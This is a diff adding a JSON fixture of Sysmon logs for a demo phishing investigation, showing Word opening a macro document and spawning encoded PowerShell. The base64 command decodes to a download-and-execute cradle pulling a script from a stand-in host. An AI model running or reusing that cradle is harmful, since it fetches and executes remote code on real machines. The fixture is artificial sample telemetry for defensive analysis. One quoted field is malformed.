@@ -1,0 +1,37 @@
+{
+  "investigation_id": "demo-phishing-001",
+  "source": "sysmon",
+  "artifacts": [
+    {
+      "artifact_id": "sysmon-chain-1",
+      "artifact_type": "jsonl",
+      "content_type": "application/jsonl",
+      "records": [
+        {
+          "EventID": 1,
+          "UtcTime": "2025-01-12T08:14:03Z",
+          "Computer": "WKSTN-07",
+          "User": "CORP\\jdoe",
+          "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": ""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" C:\\Users\\jdoe\\Downloads\\Q1_Benefits_Update.docm",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "ProcessGuid": "{A1-B1-C1}",
+          "ProcessId": 4216
+        },
+        {
+          "EventID": 1,
+          "UtcTime": "2025-01-12T08:14:21Z",
+          "Computer": "WKSTN-07",
+          "User": "CORP\\jdoe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -enc SQBFAFgAIAAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9jZG4udXBkYXRlLXN1cHBvcnQuY29tL2Evb2ZmZXIucHMxJyk=",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "ParentProcessGuid": "{A1-B1-C1}",
+          "ProcessGuid": "{A1-B1-C2}",
+          "ProcessId": 4352
+        }
+      ]
+    }
+  ]
+}
